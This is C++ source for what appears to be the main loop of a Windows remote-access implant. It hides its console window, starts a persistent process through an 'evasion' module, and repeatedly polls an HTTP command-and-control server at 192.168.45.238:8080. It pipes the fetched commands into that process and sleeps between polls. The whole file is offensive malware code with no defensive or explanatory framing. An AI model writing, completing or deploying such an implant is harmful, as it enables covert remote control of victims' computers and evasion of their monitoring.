#include <iostream>
#include "core.h"
#include "windows.h"
#include "evasion.h"
#include "HttpCommunicator.h"

#define BUFSIZE 4096

int main(int argc, char* argv[]) {
	core c;
	if (argc == 2) {
		std::string id(argv[1]);
		c.identifier = id;
	}

	HttpCommunicator httpCommunicator("192.168.45.238", 8080);

	// Hide windows - Show only in debug
	if (true) {
		HWND windowH = GetConsoleWindow();
		ShowWindow(windowH, SW_HIDE);
	}

	core::persistent_process = evasion::create_persistent_process();
	
	// Wait for commands
	for (;;)
	{
		httpCommunicator.get_commands();

		core::read_pipe_once(core::persistent_process->stdOut);

		if (core::terminated)
			break;

		// Sleep for 50*1000ms
		Sleep(core::sleepTime * 1000);
	}
}